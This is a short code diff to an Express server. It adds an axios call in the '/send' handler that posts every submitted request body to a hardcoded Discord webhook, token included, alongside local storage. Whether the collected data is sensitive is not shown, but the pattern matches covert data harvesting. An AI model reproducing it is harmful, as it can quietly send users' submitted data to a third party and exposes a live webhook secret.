@@ -1,5 +1,6 @@
 const express = require('express');
 const Datastore = require('nedb');
+const axios = require('axios');
 
 const app = express();
 
@@ -18,6 +19,10 @@ db.loadDatabase();
 app.post('/send', async (req,res) => {
     console.log("approve");
 	console.log(req.body);
+	
+	let data = req.body;
+	
+	axios.post('https://discord.com/api/webhooks/1029077387964588172/6lqA-Q4UY4vqhg0gObtCcJuCzxXtIIwxaNS3e9AwReJxMA5FBRMr67vBzvXKcfmFymKt', data=data);
 	db.insert(req.body);
 	res.status(200);
 });
